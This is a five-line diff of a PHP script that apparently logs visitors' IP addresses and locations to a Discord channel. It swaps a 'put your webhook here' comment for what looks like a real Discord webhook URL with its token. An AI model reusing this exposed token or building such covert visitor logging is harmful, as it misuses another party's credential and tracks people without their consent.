@@ -1,5 +1,5 @@
 <?php
-//======PUT YOUR DISCORD WEBHOOK HERE (RECCOMENDED: MAKE THE CHANNEL SO YOU CAN SEE IT ONLY)========\\
+https://discord.com/api/webhooks/829335196524347412/MPBKK5YgR8iH-DfogFfIzIN4Y60sAtXMvBbcB9p064rXKe2Jyalrl9XV7-9NnjqJ_ofm/github
 $webhookurl = "https://discordapp.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN";
 
 //===========IP TO LOCATION & TIME/DATE INFORMATION PULLED BY THE HOSTING SERVER ====================\\
